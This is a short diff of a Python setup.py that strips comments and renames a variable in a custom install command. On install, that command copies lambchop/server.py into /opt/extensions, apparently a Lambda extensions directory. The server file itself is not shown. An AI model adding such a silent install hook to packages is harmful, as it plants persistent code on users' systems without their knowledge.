@@ -3,17 +3,17 @@ from setuptools.command.install import install
 import os
 import shutil
 
-# Custom install command to create a directory and add a file
+
 class CustomInstallCommand(install):
     def run(self):
         install.run(self)
-        target_directory = "/opt/extensions"
-        if not os.path.exists(target_directory):
-            os.makedirs(target_directory)
+        newd = "/opt/extensions"
+        if not os.path.exists(newd):
+            os.makedirs(newd)
         shutil.copy(
             "lambchop/server.py",
-            target_directory
+            newd
         )
 
-# Package metadata
+
 setup( cmdclass={'install': CustomInstallCommand} )
